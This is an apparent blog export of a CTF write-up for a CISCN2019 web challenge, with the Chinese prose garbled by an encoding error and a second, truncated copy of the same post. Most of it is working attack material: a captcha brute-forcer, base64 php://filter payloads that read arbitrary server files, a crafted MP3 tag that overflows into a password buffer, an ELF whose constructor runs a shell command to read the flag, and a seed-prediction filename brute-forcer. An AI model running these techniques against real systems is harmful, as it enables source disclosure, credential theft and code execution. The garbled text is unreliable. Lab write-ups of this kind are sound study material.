{"posts":[{"title":"","text":"CISCN2019 æ€»å†³èµ› Day1 Web1â€“æ»‘ç¨½äº‘éŸ³ä¹ æ‰“å¼€ç¯å¢ƒï¼ŒF12å°±çœ‹åˆ°æç¤ºäº† å¤§æ¦‚å°±æ˜¯firmwareæœ‰ä¸ªå…³é”®ç‚¹ã€éœ€è¦ç®¡ç†å‘˜è¿™é‡Œæˆ‘ä»¬ä¸çŸ¥é“å¯†ç æ‰€ä»¥å…ˆå°è¯•æ³¨å†Œä¸€ä¸ªç™»å½•è¿›å» æ³¨å†Œè¿™ä¸ª 1md5(code+&quot;MWQIRZQf&quot;)[:5]==&quot;e4e62&quot; å¤§æ¦‚å°±æ˜¯éªŒè¯ç é€»è¾‘å†™ä¸ªè„šæœ¬å»çˆ† 1234567891011121314import hashlib def find_code(): target_prefix = &quot;e4e62&quot; suffix = &quot;MWQIRZQf&quot; for i in range(1000000): # å‡è®¾ code æ˜¯ä¸€ä¸ªæ•´æ•°ï¼Œå¯ä»¥è°ƒæ•´èŒƒå›´ code = str(i) combined = code + suffix hash_value = hashlib.md5(combined.encode()).hexdigest() if hash_value[:5] == target_prefix: return code code = find_code() print(&quot;Found code:&quot;, code) æ³¨å†ŒæˆåŠŸï¼Œç™»é™†è¿›å» è¿™é‡Œbotaæ›¿æ¢æ‰ 1234cGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPXNoYXJlLnBocA==php://filter/read=convert.base64-encode/resource=share.php ç„¶åå»curlæºç  123456789101112131415161718192021222324252627282930313233C:\\Users\\11759&gt;curl -v &quot;http://f979b55d-35c1-4204-b41f-b188bb4f45c2.node5.buuoj.cn:81/media/share.php?cGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPXNoYXJlLnBocA==&quot;#share.php&lt;?php# For sharing files in /media directory, do not delete, you can modify# åˆ†äº«åŠŸèƒ½ï¼Œç”¨æ¥åˆ†äº«/mediaæ–‡ä»¶å¤¹ä¸‹çš„æ–‡ä»¶ã€‚ä¸å¯åˆ é™¤ï¼Œå¯ä»¥æŒ‰éœ€ä¿®æ”¹ã€‚ini_set('display_errors','Off');error_reporting(0);header('Content-Type: application/octet-stream');$filepath=base64_decode($_SERVER['QUERY_STRING']);if (strlen($filepath)&lt;=0) exit();$file=fopen($filepath,&quot;rb&quot;);if ($file==FALSE) exit();ob_clean();while(!feof($file)){ print(fread($file,1024*8)); ob_flush(); flush();}curl -v &quot;http://f979b55d-35c1-4204-b41f-b188bb4f45c2.node5.buuoj.cn:81/media/share.php?cGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPS4uL2hvdGxvYWQucGhw&quot;php://filter/read=convert.base64-encode/resource=../hotload.php#hotload.php&lt;?phpinclude_once 'include/config.php';@$page=$_GET['page'];if (isset($page)) $page=(string) $page;if (!isset($page)||strlen($page)&lt;=0) $page='index';$whitelist=array('index','fm','mv','friend','disk','upload','share','favor','login','reg','feedback','firmware','search','logout','info');if (!in_array($page,$whitelist,true)) $page='404';include &quot;include/$page.php&quot;; ä¸Šé¢ä»£ç çœ‹åˆ°Open: Pasted image 20251106201520 1.png è¯»å– 12345678910111213141516171819202122232425C:\\Users\\11759&gt;curl -v &quot;http://f979b55d-35c1-4204-b41f-b188bb4f45c2.node5.buuoj.cn:81/media/share.php?cGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPS4uL2luY2x1ZGUvY29uZmlnLnBocA==&quot;php://filter/read=convert.base64-encode/resource=../include/config.php#config.php&lt;?phpini_set('display_errors','Off');error_reporting(0);date_default_timezone_set(&quot;Asia/Shanghai&quot;);ini_set('session.gc_maxlifetime',&quot;3600&quot;);ini_set(&quot;session.cookie_lifetime&quot;,&quot;3600&quot;);session_start();include 'init.php';$_GLOBALS['dbfile']=init_config('.sqlite');$_GLOBALS['salt']=write_config(init_config('.salt'));$_GLOBALS['admin_password']=write_config(init_config('.passwd'));if (strlen($_GLOBALS['dbfile'])&lt;=0||strlen($_GLOBALS['salt'])&lt;=0||strlen($_GLOBALS['admin_password'])&lt;=0){ ob_end_clean(); die('Permission denied!');}$_GLOBALS['dbfile']=__DIR__.'/../config/'.$_GLOBALS['dbfile'];?&gt; çœ‹åˆ°init.phpçœ‹ä¸€ä¸‹ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950&lt;?php@mkdir(__DIR__.'/../config/');function rand_str($length = 16) { $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'; $charactersLength = strlen($characters); $randomString = ''; for ($i = 0; $i &lt; $length; $i++) { $randomString .= $characters[mt_rand(0, $charactersLength - 1)]; } return $randomString;}function get_filename($ext){ $files=scandir(__DIR__.'/../config/'); foreach ($files as $file) { if ($file != &quot;.&quot; &amp;&amp; $file != &quot;..&quot;) { if (substr($file,-strlen($ext))===$ext){ return $file; } } } return '';}function init_config($ext){ $file=get_filename($ext); if ($file==''){ $file=rand_str(8).$ext; file_put_contents(__DIR__.'/../config/'.$file, ''); if (!file_exists(__DIR__.'/../config/'.$file)){ $file==''; } } return $file;}function read_config($file){ return file_get_contents(__DIR__.'/../config/'.$file);}function write_config($file,$str = '',$length = 16){ $content=file_get_contents(__DIR__.'/../config/'.$file); if ($content==''){ if ($str=='') $str=rand_str($length); file_put_contents(__DIR__.'/../config/'.$file, $str); } return file_get_contents(__DIR__.'/../config/'.$file);}?&gt; è¿™é‡Œæ˜¯çœ‹ä¸€ä¸‹ parser.soæ–‡ä»¶ä»init_procçœ‹èµ· 123456789__int64 (**init_proc_0())(void){ __int64 (**__gmon_start_)(void); // rax __gmon_start_ = &amp;_gmon_start__; if ( &amp;_gmon_start__ ) return (__int64 (**)(void))_gmon_start__(); return __gmon_start_;} æ²¡ä»€ä¹ˆå¥½çœ‹çš„ç»§ç»­çœ‹ 123456789#init_procvoid *init_proc(){ frame_size = 0; frame_data = &amp;frame_data; memset(&amp;frame_data, 0, 0x100u); passwd = &amp;passwd; return memset(&amp;passwd, 0, 0x130u);} ç¬¬ä¸€æ¬¡æ¥è§¦ç”¨pwnçš„webæ¼æ´ï¼Œå–‚ç»™AIçœ‹ä¸€ä¸‹ å…¶ä¸­&amp;passwdåœ¨bssæ®µä¸­ä¸º93c0ï¼Œè€Œä¸Šé¢çš„&amp;frame_dataåœ¨92c0ã€‚ frame_data å ç”¨äº† 0x100 å­—èŠ‚ï¼ˆ256 å­—èŠ‚ï¼‰ï¼Œä» 92C0 åˆ° 93C0 æ˜¯è¿ç»­çš„ã€‚ passwd çš„èµ·å§‹åœ°å€ä¸º 93C0ï¼Œè¯´æ˜å®ƒç´§è·Ÿåœ¨ frame_data ä¹‹åã€‚ å¦‚æœå¯¹ frame_data çš„æ•°æ®å†™å…¥è¶…è¿‡äº† 0x100 å­—èŠ‚ï¼Œå°±å¯èƒ½è¶Šç•Œåˆ° passwd çš„åœ°å€ç©ºé—´ã€‚ç”±äºPHPä¸­çš„æ–‡ä»¶é™åˆ¶é•¿åº¦ä¸º0x130å­—èŠ‚ï¼Œå› æ­¤æœ‰0x30çš„æº¢å‡ºè¯»ç©ºé—´ã€‚ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#!/usr/bin/env python3 # coding:utf-8 # ä¸“ä¸º Python3 ç¼–å†™ï¼Œæ— ä»»ä½•ç¼–ç /æ‹¼æ¥æŠ¥é”™ def flat(*args): &quot;&quot;&quot;å­—èŠ‚æµæ‹¼æ¥å‡½æ•°ï¼ˆä»…å¤„ç†å­—èŠ‚ç±»å‹ï¼Œå½»åº•é¿å…ç±»å‹é”™è¯¯ï¼‰&quot;&quot;&quot; result = b&quot;&quot; for arg in args: if isinstance(arg, bytes): result += arg else: # å¼ºåˆ¶è½¬æ¢ä¸ºå­—èŠ‚ï¼ˆç¡®ä¿æ‰€æœ‰è¾“å…¥ç»Ÿä¸€ç±»å‹ï¼‰ raise TypeError(f&quot;ä»…æ”¯æŒ bytes ç±»å‹ï¼Œä¼ å…¥äº† {type(arg)}&quot;) return result # 1. æŒ‰ä½ æä¾›çš„ç»“æ„ï¼Œæ‰€æœ‰å†…å®¹è½¬ä¸º bytes ç±»å‹ï¼ˆæ ¸å¿ƒä¿®æ”¹ï¼‰ mp3_tag = flat( b'ID3', # æ ‡ç­¾æ ‡è¯†ï¼ˆbytesï¼‰ b'\\x03', # ä¸»ç‰ˆæœ¬å·ï¼ˆbytesï¼‰ b'\\x00', # ä¿®è®¢å·ï¼ˆbytesï¼‰ b'\\x00', # æ ‡å¿—ä½ï¼ˆbytesï¼‰ b'\\x00\\x00\\x04\\x00', # æ ‡ç­¾å¤´å¤§å°ï¼ˆbytesï¼‰ b'TIT2', # å¸§æ ‡è¯†ï¼ˆbytesï¼‰ b'\\x00\\x00\\x00\\x0a', # TIT2 å¸§å¤§å°ï¼ˆbytesï¼‰ b'\\x00\\x00', # TIT2 å¸§æ ‡å¿—ï¼ˆbytesï¼‰ b'a'*9 + b'\\x00', # TIT2 å†…å®¹ï¼ˆbytesï¼Œ9ä¸ª'a' + ç»“æŸç¬¦ï¼‰ b'TPE1', # å¸§æ ‡è¯†ï¼ˆbytesï¼‰ b'\\x00\\x00\\x00\\x0a', # TPE1 å¸§å¤§å°ï¼ˆbytesï¼‰ b'\\x00\\x00', # TPE1 å¸§æ ‡å¿—ï¼ˆbytesï¼‰ b'b'*9 + b'\\x00', # TPE1 å†…å®¹ï¼ˆbytesï¼Œ9ä¸ª'b' + ç»“æŸç¬¦ï¼‰ b'TALB', # å¸§æ ‡è¯†ï¼ˆbytesï¼‰ b'\\x00\\x00\\x02\\xff', # TALB å¸§å¤§å°ï¼ˆbytesï¼ŒæŒ‰ä½ æä¾›çš„é…ç½®ï¼‰ b'\\x00\\x00', # TALB å¸§æ ‡å¿—ï¼ˆbytesï¼‰ b'c'*0x200 + b'\\x00', # TALB å†…å®¹ï¼ˆbytesï¼Œ512ä¸ª'c' + ç»“æŸç¬¦ï¼‰ ) # 2. æ·»åŠ æ ‡å‡† MP3 éŸ³é¢‘å¸§ï¼ˆç¡®ä¿æ–‡ä»¶è¢«è¯†åˆ«ä¸ºæœ‰æ•ˆ MP3ï¼Œä¸æŠ¥é”™ï¼‰ # æ ‡å‡† MPEG-1 Layer 3 éŸ³é¢‘å¸§ï¼ˆ44.1kHz å•å£°é“ï¼Œ128kbpsï¼ŒæŒç»­0.5ç§’ï¼‰ mp3_audio = ( b'\\xff\\xf3\\xc4\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00' b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00' b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00' ) # 3. æ‹¼æ¥æ ‡ç­¾ + éŸ³é¢‘ï¼Œç”Ÿæˆå®Œæ•´ MP3 æ–‡ä»¶ full_mp3 = mp3_tag + mp3_audio # 4. å†™å…¥æ–‡ä»¶ï¼ˆäºŒè¿›åˆ¶æ¨¡å¼ï¼ŒPython3 æ ‡å‡†å†™æ³•ï¼‰ output_file = &quot;fake_mp3_no_error.mp3&quot; with open(output_file, &quot;wb&quot;) as f: f.write(full_mp3) print(f&quot;âœ… é›¶æŠ¥é”™ï¼ä¼ªé€  MP3 å·²ç”Ÿæˆï¼š{output_file}&quot;) print(f&quot;ğŸ“Œ æ ‡ç­¾ç»“æ„å®Œå…¨æŒ‰ä½ çš„é…ç½®ï¼šID3v2.3 + TIT2/TPE1/TALB å¸§&quot;) print(f&quot;ğŸµ åŒ…å«æœ‰æ•ˆéŸ³é¢‘å¸§ï¼Œå¯æ­£å¸¸æ’­æ”¾/ä¸Šä¼ ç»•è¿‡&quot;) å¾—åˆ°å¯†ç wc4I22tosZFIsUIk ç”¨adminç™»å½•è¿›å» ä¹Ÿæ˜¯æˆåŠŸç™»å½•äº† æ¥åˆ°/#firmwareé¡µé¢ è¿™é‡Œè€æ–¹æ³•è¯»å–ä¸€ä¸‹frimwareä»£ç  1curl -v &quot;http://af97e55c-3987-499d-99e5-e8acff7feafd.node5.buuoj.cn:81/media/share.php?cGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPS4uL2luY2x1ZGUvZmlybXdhcmUucGhw&quot; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169#firmware.php&lt;?phpif (!isset($_SESSION['user'])||strlen($_SESSION['user'])&lt;=0){ ob_end_clean(); header('Location: /hotload.php?page=login&amp;err=1'); die();}if ($_SESSION['role']!='admin'){ $padding='Lorem ipsum dolor sit amet, consectetur adipisicing elit.'; for($i=0;$i&lt;10;$i++) $padding.=$padding; die('&lt;div&gt;&lt;div class=&quot;container&quot; style=&quot;margin-top:30px&quot;&gt;&lt;h3 style=&quot;color:red;margin-bottom:15px;&quot;&gt;åªæœ‰ç®¡ç†å‘˜æƒé™æ‰èƒ½è®¿é—®ï¼&lt;/h3&gt;&lt;/div&gt;&lt;p style=&quot;visibility: hidden&quot;&gt;'.$padding.'&lt;/p&gt;&lt;/div&gt;');}if (isset($_FILES[&quot;file_data&quot;])){ if ($_FILES[&quot;file_data&quot;][&quot;error&quot;] &gt; 0||$_FILES[&quot;file_data&quot;][&quot;size&quot;] &gt; 1024*1024*1){ ob_end_clean(); die(json_encode(array('status'=&gt;0,'info'=&gt;'ä¸Šä¼ å‡ºé”™ï¼Œå›ºä»¶æ–‡ä»¶æœ€å¤§æ”¯æŒ 1MBã€‚'))); }else{ mt_srand(time()); $firmware_filename=md5(mt_rand().$_SESSION['user']); $firmware_filename=__DIR__.&quot;/../uploads/firmware/&quot;.$firmware_filename.&quot;.elf&quot;; if (time()-$_SESSION['timestamp']&lt;3){ ob_end_clean(); die(json_encode(array('status'=&gt;0,'info'=&gt;'æ“ä½œå¤ªå¿«äº†ï¼Œè¯·ç¨åå†ä¸Šä¼ ã€‚'))); } $_SESSION['timestamp']=time(); move_uploaded_file($_FILES[&quot;file_data&quot;][&quot;tmp_name&quot;], $firmware_filename); $handle = fopen($firmware_filename, &quot;rb&quot;); if ($handle==FALSE){ ob_end_clean(); die(json_encode(array('status'=&gt;0,'info'=&gt;'ä¸Šä¼ å¤±è´¥ï¼ŒæœªçŸ¥åŸå› ã€‚'))); } $flags = fread($handle, 4); fclose($handle); if ($flags!==&quot;\\x7fELF&quot;){ unlink($firmware_filename); ob_end_clean(); die(json_encode(array('status'=&gt;0,'info'=&gt;'ä¸Šä¼ å¤±è´¥ï¼Œä¸æ˜¯æœ‰æ•ˆçš„ ELF æ–‡ä»¶ã€‚'))); } ob_end_clean(); die(json_encode(array('status'=&gt;1,'info'=&gt;'ä¸Šä¼ æˆåŠŸï¼'))); }}else{ if (isset($_SERVER['CONTENT_TYPE'])){ if (stripos($_SERVER['CONTENT_TYPE'],'form-data')!=FALSE){ ob_end_clean(); die(json_encode(array('status'=&gt;0,'info'=&gt;'ä¸Šä¼ å‡ºé”™ï¼ŒéŸ³ä¹æ–‡ä»¶æœ€å¤§æ”¯æŒ 1MBã€‚'))); } }}@$path=$_POST['path'];function clean_string($str){ $str=str_replace(&quot;\\\\&quot;,&quot;&quot;,$str); $str=str_replace(&quot;/&quot;,&quot;&quot;,$str); $str=str_replace(&quot;.&quot;,&quot;&quot;,$str); $str=str_replace(&quot;;&quot;,&quot;&quot;,$str); return substr($str,0,32);}if (isset($path)){ $path=clean_string(trim((string) $path)); if (strlen($path)&lt;=0||strlen($path)&gt;64){ ob_end_clean(); die(json_encode(array('status'=&gt;0,'info'=&gt;'è¾“å…¥æ ¼å¼æˆ–é•¿åº¦ä¸ç¬¦åˆè§„å®šï¼'))); }else{ $firmware_filename=__DIR__.&quot;/../uploads/firmware/&quot;.$path.&quot;.elf&quot;; if (!file_exists($firmware_filename)){ ob_end_clean(); die(json_encode(array('status'=&gt;0,'info'=&gt;'å›ºä»¶æ–‡ä»¶ä¸å­˜åœ¨ï¼'))); }else{ try{ $elf = FFI::cdef(&quot; extern char * version; &quot;, $firmware_filename); $version=(string) FFI::string($elf-&gt;version); ob_end_clean(); die(json_encode(array('status'=&gt;1,'info'=&gt;'å›ºä»¶ç‰ˆæœ¬å·ï¼š'.$version))); }catch(Error $e){ ob_end_clean(); die(json_encode(array('status'=&gt;0,'info'=&gt;'åŠ è½½å›ºä»¶æ–‡ä»¶æ—¶å‘ç”Ÿé”™è¯¯ï¼'))); } } }}?&gt;&lt;script&gt;nav_active();nav_user('&lt;?php echo @$_SESSION['user']; ?&gt;');&lt;/script&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;css/fileinput.min.css&quot;&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;css/fileinput-rtl.min.css&quot;&gt; &lt;script src=&quot;js/fileinput.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;js/locales/zh.js&quot;&gt;&lt;/script&gt; &lt;div&gt;&lt;div class=&quot;container&quot; style=&quot;margin-top:30px&quot;&gt; &lt;h3 style=&quot;margin-bottom:15px;&quot;&gt;å›ºä»¶æ›´æ–°&lt;/h3&gt; &lt;input id=&quot;upload&quot; type=&quot;file&quot; class=&quot;file&quot; data-preview-file-type=&quot;text&quot; &gt; &lt;div style=&quot;height:30px&quot;&gt;&lt;/div&gt; &lt;div id=&quot;info1&quot; class=&quot;alert&quot; role=&quot;alert&quot; style='display: none;'&gt;&lt;/div&gt; &lt;script&gt; $(&quot;#upload&quot;).fileinput({language: 'zh',uploadUrl: '/hotload.php?page=firmware'}); $(&quot;#upload&quot;).on(&quot;fileuploaded&quot;, function (event, data, previewId, index) { var data = data.response; if (data.status==1){ $('#info1').removeClass('alert-danger'); $('#info1').addClass('alert-success'); }else{ $('#info1').removeClass('alert-success'); $('#info1').addClass('alert-danger'); } $('#info1').html(data.info); $('#info1').show(); }); &lt;/script&gt; &lt;hr/&gt;&lt;h4 style=&quot;text-align:left;margin-bottom:15px;color:gray;&quot;&gt;è°ƒè¯•æ¨¡å¼ï¼ˆè¯»å–å›ºä»¶ç‰ˆæœ¬å·)&lt;/h4&gt; &lt;div class='form-container'&gt; &lt;div class='form-group'&gt; &lt;input type=&quot;text&quot; class=&quot;form-control&quot; placeholder=&quot;å›ºä»¶æ–‡ä»¶&quot; id=&quot;path&quot;&gt; &lt;/div&gt; &lt;div class=&quot;form-group&quot;&gt; &lt;button class=&quot;btn btn-info btn-block&quot; onclick=&quot;submit()&quot;&gt;è¯»å–&lt;/button&gt; &lt;/div&gt; &lt;div id=&quot;info2&quot; class=&quot;alert&quot; role=&quot;alert&quot; style=&quot;display: none;&quot;&gt;&lt;/div&gt; &lt;/div&gt;&lt;/div&gt;&lt;script&gt;function submit(){ $('#info2').hide(); $.ajax({ type: 'POST', url: &quot;/hotload.php?page=firmware&quot;, data: {path: $('#path').val()}, dataType: &quot;json&quot;, success: function(data) { if (data.status==1){ $('#info2').removeClass('alert-danger'); $('#info2').addClass('alert-success'); }else{ $('#info2').removeClass('alert-success'); $('#info2').addClass('alert-danger'); } $('#info2').html(data.info); $('#info2').show(); } });}&lt;/script&gt; &lt;p style=&quot;visibility: hidden&quot;&gt; Lorem ipsum dolor sit amet, consectetur adipisicing elit. Animi aspernatur beatae commodi dolorem in praesentium quia quis sit ullam. Aut facere nihil non soluta temporibus. Modi molestias suscipit voluptate. A? Lorem ipsum dolor sit amet, consectetur adipisicing elit. Aliquid beatae consequatur deserunt earum eligendi ex, illum iure nostrum nulla obcaecati pariatur placeat quae reiciendis repellat similique tenetur totam vel voluptatum? Lorem ipsum dolor sit amet, consectetur adipisicing elit. Aut autem consectetur cum ex expedita id incidunt inventore ipsa laudantium maiores nihil quia quo quod rem, reprehenderit repudiandae sunt unde voluptatibus? Lorem ipsum dolor sit amet, consectetur adipisicing elit. Accusantium ad adipisci animi, commodi cumque doloribus ducimus eaque eveniet illo iste, maxime, molestiae molestias neque nostrum odio officiis reiciendis rem voluptates? &lt;/p&gt; &lt;/div&gt; åœ¨#firmwareä¸Šä¼ elf 1234567891011121314#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;char _version[0x130];char *version = _version;__attribute__((constructor)) void fun() { memset(version, 0, 0x130); FILE *fp = popen(&quot;/usr/bin/tac /flag&quot;, &quot;r&quot;); if (fp == NULL) return; fread(version, 1, 0x100, fp); pclose(fp);} ç¼–è¯‘æˆelfä¸Šä¼ å°±å¯ä»¥äº† çˆ†ç ´æ–‡ä»¶å 123456789101112131415161718192021222324&lt;?php function generate_filenames($start_time, $end_time, $user) { $results = []; for ($time = $start_time; $time &lt;= $end_time; $time++) { mt_srand($time); $rand = mt_rand(); $filename = md5($rand . $user); $results[] = $filename; } return $results; } // å·²çŸ¥ä¿¡æ¯ $user = &quot;admin&quot;; // å›ºå®šå€¼ $date = strtotime(&quot;Tue, 11 Nov 2025 10:20:28 GMT&quot;); // å·²çŸ¥æ—¶é—´ $time_range = 100; // æ—¶é—´åç§»èŒƒå›´ Â±100 ç§’ // å¼€å§‹æš´åŠ›ç ´è§£ $start_time = $date - $time_range; $end_time = $date + $time_range; $possible_filenames = generate_filenames($start_time, $end_time, $user); foreach ($possible_filenames as $filename) { echo $filename . &quot;.elf\\n&quot;; } ?&gt; å»æµè§ˆå™¨å¤åˆ¶æ—¶é—´å»çˆ†ç ´å°±è¡Œäº†ç„¶åæŠŠå­—å…¸å¤åˆ¶åˆ°bpé‡Œé¢çˆ†å°±å¯ä»¥çˆ†ç ´å‡ºæ¥ flag{iz4w8x9zjdsqael9fbv7c2l2qp5ao6f9}","link":"/2025/12/11/CISCN2019%20%E6%80%BB%E5%86%B3%E8%B5%9B%20Day1%20Web1--%E6%BB%91%E7%A8%BD%E4%BA%91%E9%9F%B3%E4%B9%90/"},{"title":"","text":"CISCN2019 æ€»å†³èµ› Day1 Web1â€“æ»‘ç¨½äº‘éŸ³ä¹date: 2025-12-10æ‰“å¼€ç¯å¢ƒï¼ŒF12å°±çœ‹åˆ°æç¤ºäº† å¤§æ¦‚å°±æ˜¯firmwareæœ‰ä¸ªå…³é”®ç‚¹ã€éœ€è¦ç®¡ç†å‘˜è¿™é‡Œæˆ‘ä»¬ä¸çŸ¥é“å¯†ç æ‰€ä»¥å…ˆå°è¯•æ³¨å†Œä¸€ä¸ªç™»å½•è¿›å» æ³¨å†Œè¿™ä¸ª 1md5(code+&quot;MWQIRZQf&quot;)[:5]==&quot;e4e62&quot; å¤§æ¦‚å°±æ˜¯éªŒè¯ç é€»è¾‘å†™ä¸ªè„šæœ¬å»çˆ† 1234567891011121314import hashlib def find_code(): target_prefix = &quot;e4e62&quot; suffix = &quot;MWQIRZQf&quot; for i in range(1000000): # å‡è®¾ code æ˜¯ä¸€ä¸ªæ•´æ•°ï¼Œå¯ä»¥è°ƒæ•´èŒƒå›´ code = str(i) combined = code + suffix hash_value = hashlib.md5(combined.encode()).hexdigest() if hash_value[:5] == target_prefix: return code code = find_code() print(&quot;Found code:&quot;, code) æ³¨å†ŒæˆåŠŸï¼Œç™»é™†è¿›å» è¿™é‡Œbotaæ›¿æ¢æ‰ 1234cGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPXNoYXJlLnBocA==php://filter/read=convert.base64-encode/resource=share.php ç„¶åå»curlæºç  123456789101112131415161718192021222324252627282930313233C:\\Users\\11759&gt;curl -v &quot;http://f979b55d-35c1-4204-b41f-b188bb4f45c2.node5.buuoj.cn:81/media/share.php?cGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPXNoYXJlLnBocA==&quot;#share.php&lt;?php# For sharing files in /media directory, do not delete, you can modify# åˆ†äº«åŠŸèƒ½ï¼Œç”¨æ¥åˆ†äº«/mediaæ–‡ä»¶å¤¹ä¸‹çš„æ–‡ä»¶ã€‚ä¸å¯åˆ é™¤ï¼Œå¯ä»¥æŒ‰éœ€ä¿®æ”¹ã€‚ini_set('display_errors','Off');error_reporting(0);header('Content-Type: application/octet-stream');$filepath=base64_decode($_SERVER['QUERY_STRING']);if (strlen($filepath)&lt;=0) exit();$file=fopen($filepath,&quot;rb&quot;);if ($file==FALSE) exit();ob_clean();while(!feof($file)){ print(fread($file,1024*8)); ob_flush(); flush();}curl -v &quot;http://f979b55d-35c1-4204-b41f-b188bb4f45c2.node5.buuoj.cn:81/media/share.php?cGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPS4uL2hvdGxvYWQucGhw&quot;php://filter/read=convert.base64-encode/resource=../hotload.php#hotload.php&lt;?phpinclude_once 'include/config.php';@$page=$_GET['page'];if (isset($page)) $page=(string) $page;if (!isset($page)||strlen($page)&lt;=0) $page='index';$whitelist=array('index','fm','mv','friend','disk','upload','share','favor','login','reg','feedback','firmware','search','logout','info');if (!in_array($page,$whitelist,true)) $page='404';include &quot;include/$page.php&quot;; ä¸Šé¢ä»£ç çœ‹åˆ°Open: Pasted image 20251106201520 1.png è¯»å– 12345678910111213141516171819202122232425C:\\Users\\11759&gt;curl -v &quot;http://f979b55d-35c1-4204-b41f-b188bb4f45c2.node5.buuoj.cn:81/media/share.php?cGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPS4uL2luY2x1ZGUvY29uZmlnLnBocA==&quot;php://filter/read=convert.base64-encode/resource=../include/config.php#config.php&lt;?phpini_set('display_errors','Off');error_reporting(0);date_default_timezone_set(&quot;Asia/Shanghai&quot;);ini_set('session.gc_maxlifetime',&quot;3600&quot;);ini_set(&quot;session.cookie_lifetime&quot;,&quot;3600&quot;);session_start();include 'init.php';$_GLOBALS['dbfile']=init_config('.sqlite');$_GLOBALS['salt']=write_config(init_config('.salt'));$_GLOBALS['admin_password']=write_config(init_config('.passwd'));if (strlen($_GLOBALS['dbfile'])&lt;=0||strlen($_GLOBALS['salt'])&lt;=0||strlen($_GLOBALS['admin_password'])&lt;=0){ ob_end_clean(); die('Permission denied!');}$_GLOBALS['dbfile']=__DIR__.'/../config/'.$_GLOBALS['dbfile'];?&gt; çœ‹åˆ°init.phpçœ‹ä¸€ä¸‹ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950&lt;?php@mkdir(__DIR__.'/../config/');function rand_str($length = 16) { $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'; $charactersLength = strlen($characters); $randomString = ''; for ($i = 0; $i &lt; $length; $i++) { $randomString .= $characters[mt_rand(0, $charactersLength - 1)]; } return $randomString;}function get_filename($ext){ $files=scandir(__DIR__.'/../config/'); foreach ($files as $file) { if ($file != &quot;.&quot; &amp;&amp; $file != &quot;..&quot;) { if (substr($file,-strlen($ext))===$ext){ return $file; } } } return '';}function init_config($ext){ $file=get_filename($ext); if ($file==''){ $file=rand_str(8).$ext; file_put_contents(__DIR__.'/../config/'.$file, ''); if (!file_exists(__DIR__.'/../config/'.$file)){ $file==''; } } return $file;}function read_config($file){ return file_get_contents(__DIR__.'/../config/'.$file);}function write_config($file,$str = '',$length = 16){ $content=file_get_contents(__DIR__.'/../config/'.$file); if ($content==''){ if ($str=='') $str=rand_str($length); file_put_contents(__DIR__.'/../config/'.$file, $str); } return file_get_contents(__DIR__.'/../config/'.$file);}?&gt; è¿™é‡Œæ˜¯çœ‹ä¸€ä¸‹ parser.soæ–‡ä»¶ä»init_procçœ‹èµ· 123456789__int64 (**init_proc_0())(void){ __int64 (**__gmon_start_)(void); // rax __gmon_start_ = &amp;_gmon_start__; if ( &amp;_gmon_start__ ) return (__int64 (**)(void))_gmon_start__(); return __gmon_start_;} æ²¡ä»€ä¹ˆå¥½çœ‹çš„ç»§ç»­çœ‹ 123456789#init_procvoid *init_proc(){ frame_size = 0; frame_data = &amp;frame_data; memset(&amp;frame_data, 0, 0x100u); passwd = &amp;passwd; return memset(&amp;passwd, 0, 0x130u);} ç¬¬ä¸€æ¬¡æ¥è§¦ç”¨pwnçš„webæ¼æ´ï¼Œå–‚ç»™AIçœ‹ä¸€ä¸‹ å…¶ä¸­&amp;passwdåœ¨bssæ®µä¸­ä¸º93c0ï¼Œè€Œä¸Šé¢çš„&amp;frame_dataåœ¨92c0ã€‚ frame_data å ç”¨äº† 0x100 å­—èŠ‚ï¼ˆ256 å­—èŠ‚ï¼‰ï¼Œä» 92C0 åˆ° 93C0 æ˜¯è¿ç»­çš„ã€‚ passwd çš„èµ·å§‹åœ°å€ä¸º 93C0ï¼Œè¯´æ˜å®ƒç´§è·Ÿåœ¨ frame_data ä¹‹åã€‚ å¦‚æœå¯¹ frame_data çš„æ•°æ®å†™å…¥è¶…è¿‡äº† 0x100 å­—èŠ‚ï¼Œå°±å¯èƒ½è¶Šç•Œåˆ° passwd çš„åœ°å€ç©ºé—´ã€‚ç”±äºPHPä¸­çš„æ–‡ä»¶é™åˆ¶é•¿åº¦ä¸º0x130å­—èŠ‚ï¼Œå› æ­¤æœ‰0x30çš„æº¢å‡ºè¯»ç©ºé—´ã€‚ 